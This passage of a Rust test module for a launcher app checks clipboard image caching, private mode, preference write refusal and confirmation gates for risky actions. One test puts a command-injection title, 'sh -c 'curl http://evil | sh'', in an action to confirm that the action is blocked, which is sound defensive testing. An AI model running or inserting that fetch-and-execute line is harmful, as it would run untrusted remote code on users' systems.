            test_cache_dir("clipboard-image-roundtrip-config"),
            HashMap::new(),
        );
        let stored = with_clipboard_cache_dir(&cache, || {
            app.add_clipboard_image(&image.to_string_lossy()).unwrap()
        });
        assert!(stored);

        let entry = app
            .clipboard_history
            .first()
            .cloned()
            .expect("entry stored");
        assert_eq!(
            with_clipboard_cache_dir(&cache, || crate::clipboard_image_path(&entry)),
            Some(image.to_string_lossy().as_ref())
        );
        assert_eq!(
            with_clipboard_cache_dir(&cache, || classify_clipboard_text(&entry)),
            ClipboardKind::Image
        );

        // The pruner must keep the file the entry still references.
        with_clipboard_cache_dir(&cache, || {
            prune_clipboard_image_cache(&app.clipboard_history).unwrap();
        });
        assert!(image.exists());

        let _ = fs::remove_dir_all(cache);
    }

    #[test]
    fn form_submission_requires_confirmation() {
        let mut app = test_app(test_cache_dir("form-confirm"), HashMap::new());
        let action = Action::new(
            "Command",
            "Deploy",
            ActionKind::Form(ActionForm {
                name: "Deploy".to_string(),
                fields: Vec::new(),
                command: ActionFormCommand::Shell("true".to_string()),
                env: HashMap::new(),
                preferences: HashMap::new(),
                current_args: HashMap::new(),
                partial_query: String::new(),
                capabilities: crate::CapabilitySet::new(vec![crate::Capability::Shell]),
                risk: ActionRisk::Shell,
            }),
            0,
        )
        .with_risk(ActionRisk::Shell);

        // Interactive policy: the form must ask before running.
        assert_eq!(
            app.run_form_action(&action, HashMap::new()),
            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
        );
        assert_eq!(crate::take_exec_count(), 0);

        // Confirmed policy runs it exactly once, through the gateway.
        assert_eq!(
            app.run_form_action_confirmed(&action, HashMap::new()),
            ExecutionDecision::RunNow
        );
        assert_eq!(crate::take_exec_count(), 1);
    }

    #[test]
    fn form_without_capabilities_is_denied_even_when_confirmed() {
        let mut app = test_app(test_cache_dir("form-denied"), HashMap::new());
        let action = Action::new(
            "Command",
            "Deploy",
            ActionKind::Form(ActionForm {
                name: "Deploy".to_string(),
                fields: Vec::new(),
                command: ActionFormCommand::Shell("true".to_string()),
                env: HashMap::new(),
                preferences: HashMap::new(),
                current_args: HashMap::new(),
                partial_query: String::new(),
                capabilities: crate::CapabilitySet::empty(),
                risk: ActionRisk::Shell,
            }),
            0,
        );

        let decision = app.run_form_action_confirmed(&action, HashMap::new());
        assert!(
            matches!(decision, ExecutionDecision::Denied(_)),
            "expected denial, got {decision:?}"
        );
        assert_eq!(crate::take_exec_count(), 0);
    }

    #[test]
    fn set_preference_refuses_when_load_failed() {
        // M-10: after a corrupt preferences.toml the UI must not write, or it
        // would replace the file it could not read.
        let mut app = test_app(test_cache_dir("prefs-readonly"), HashMap::new());
        app.preferences_writable = false;

        let error = app
            .set_preference("ai_model".to_string(), "llama".to_string())
            .expect_err("writing must be refused");
        assert_eq!(error.kind(), io::ErrorKind::PermissionDenied);
        assert!(error.to_string().contains("not valid TOML"), "{error}");
        assert!(
            !app.preferences.contains_key("ai_model"),
            "the in-memory map must not change either"
        );
        assert!(app.get_preferences().is_empty());
    }

    #[test]
    fn run_in_terminal_is_refused_for_blocked_actions() {
        // F-2: `Run in Terminal` runs the action's text through a shell, so a
        // blocked action (whose `value()` falls back to manifest-controlled
        // title text) must not be executable through it.
        let mut app = test_app(test_cache_dir("terminal-blocked"), HashMap::new());
        let blocked = Action::new(
            "Command",
            "Backup helper; sh -c 'curl http://evil | sh'; #",
            ActionKind::None,
            0,
        )
        .with_capabilities(crate::CapabilitySet::empty());

        assert_eq!(
            crate::secondary_action_risk(&blocked, SecondaryActionKind::RunInTerminal),
            ActionRisk::Shell,
            "terminal launches always ask for confirmation"
        );
        assert_eq!(
            app.run_secondary_action(&blocked, SecondaryActionKind::RunInTerminal)
                .unwrap(),
            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
        );
        let decision = app
            .run_secondary_action_confirmed(&blocked, SecondaryActionKind::RunInTerminal)
            .unwrap();
        assert!(
            matches!(decision, ExecutionDecision::Denied(_)),
            "expected denial, got {decision:?}"
        );
        assert_eq!(crate::take_exec_count(), 0);
    }

    #[test]
    fn clipboard_clear_removes_image_cache_files() {
        let dir = test_cache_dir("clipboard-clear");
        fs::create_dir_all(&dir).unwrap();
        let image = dir.join("image.png");
        let metadata = dir.join("metadata.txt");
        fs::write(&image, b"png").unwrap();
        fs::write(&metadata, b"keep").unwrap();

        clear_clipboard_image_cache_dir(&dir).unwrap();

        assert!(!image.exists());
        assert!(metadata.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_prune_removes_orphan_images() {
        let dir = test_cache_dir("clipboard-prune");
        fs::create_dir_all(&dir).unwrap();
        let kept = dir.join("kept.png");
        let orphan = dir.join("orphan.png");
        fs::write(&kept, b"png").unwrap();
        fs::write(&orphan, b"png").unwrap();
        let entries = vec![image_entry(&kept)];

        // M-15: only paths inside the clipboard cache count as image entries,
        // so the cache dir is overridden for the duration of the prune.
        with_clipboard_cache_dir(&dir, || {
            prune_clipboard_image_cache_dir(&dir, &entries).unwrap();
        });

        assert!(kept.exists());
        assert!(!orphan.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_delete_keeps_still_referenced_image() {
        let dir = test_cache_dir("clipboard-delete");
        fs::create_dir_all(&dir).unwrap();
        let image = dir.join("shared.png");
        fs::write(&image, b"png").unwrap();
        let entries = vec![image_entry(&image), "plain text".to_string()];

        with_clipboard_cache_dir(&dir, || {
            prune_clipboard_image_cache_dir(&dir, &entries).unwrap();
        });

        assert!(image.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_disabled_does_not_record_text() {
        let config_dir = test_cache_dir("clipboard-disabled-config");
        let mut app = test_app(
            config_dir.clone(),
            HashMap::from([("clipboard_history_enabled".to_string(), "false".to_string())]),
        );

        assert!(!app.add_clipboard_text("secret").unwrap());
        assert!(app.clipboard_history.is_empty());
        assert!(!config_dir.join("zeshicast.db").exists());
    }

    #[test]
    fn private_mode_does_not_record_clipboard() {
        let config_dir = test_cache_dir("clipboard-private-config");
        let mut app = test_app(
            config_dir.clone(),
            HashMap::from([("clipboard_private_mode".to_string(), "true".to_string())]),
        );

        assert!(!app.add_clipboard_text("secret").unwrap());
        assert!(app.clipboard_history.is_empty());
        assert!(!config_dir.join("zeshicast.db").exists());
    }

    fn clipboard_action(value: &str) -> Action {
        Action::new("Clipboard", value, ActionKind::Copy(value.to_string()), 1)
    }

    #[test]
    fn risky_secondary_actions_require_confirmation() {
        let mut app = test_app(test_cache_dir("secondary-risky-config"), HashMap::new());
        app.clipboard_history = vec!["secret".to_string(), "other".to_string()];
        let action = clipboard_action("secret");

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::DeleteClipboardItem)
            .unwrap();
        assert_eq!(
            decision,
            ExecutionDecision::NeedsConfirmation(ActionRisk::Destructive)
        );

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::ClearClipboardHistory)
            .unwrap();
        assert_eq!(
            decision,
            ExecutionDecision::NeedsConfirmation(ActionRisk::ClipboardClear)
        );

        assert_eq!(app.clipboard_history, vec!["secret", "other"]);
    }

    #[test]
    fn confirmed_secondary_actions_execute() {
        let config_dir = test_cache_dir("secondary-confirmed-config");
        let mut app = test_app(config_dir.clone(), HashMap::new());
        app.clipboard_history = vec!["secret".to_string(), "other".to_string()];

        let action = clipboard_action("secret");
        let decision = app
            .run_secondary_action_confirmed(&action, SecondaryActionKind::DeleteClipboardItem)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert_eq!(app.clipboard_history, vec!["other"]);

        let decision = app
            .run_secondary_action_confirmed(&action, SecondaryActionKind::ClearClipboardHistory)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(app.clipboard_history.is_empty());
        assert!(!storage::clipboard_has_data(&config_dir));
        let _ = fs::remove_dir_all(config_dir);
    }

    #[test]
    fn normal_secondary_actions_run_without_confirmation() {
        let config_dir = test_cache_dir("secondary-normal-config");
        let mut app = test_app(config_dir, HashMap::new());
        let action = clipboard_action("note");

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::Pin)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(app.is_pinned(&action));

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::Unpin)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(!app.is_pinned(&action));
        let _ = fs::remove_dir_all(test_cache_dir("secondary-normal-config"));
    }
}
